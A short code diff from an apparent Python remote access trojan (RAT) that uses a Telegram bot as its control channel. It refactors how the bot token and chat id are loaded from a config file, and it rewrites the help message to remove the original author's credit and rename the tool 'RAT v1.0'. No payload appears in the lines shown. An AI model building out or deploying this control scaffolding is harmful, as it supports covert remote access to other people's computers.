@@ -17,15 +17,10 @@ import json
 logging.config.fileConfig(os.path.join(os.getcwd(), 'config', 'logconf.ini'))
 logging = logging.getLogger('spider')
 
-
-def loads():
-    with open(os.path.join(os.getcwd(), 'config', 'config.json'), 'r') as f:
-        return json.load(f)
-
-
-bot_token = loads()["token"]
-chat_id = loads()["id"]
-
+with open(os.path.join(os.getcwd(), 'config', 'config.json'), 'r') as f:
+    conf = json.load(f)
+bot_token = conf["token"]
+chat_id = conf["id"]
 bot = telebot.TeleBot(bot_token)
 
 
@@ -42,9 +37,10 @@ def keyboard():
     markup.add(button_2)
     return markup
 
+
 @bot.message_handler(commands=['help'])
 def send_message(command):
-    bot.send_message(chat_id, 'RAT-via-Telegram-Bot' + '\n\nCoded by romarakhlin' + '\nback - /start')
+    bot.send_message(chat_id, 'RAT v1.0' + '\n\n@2024')
 
 
 
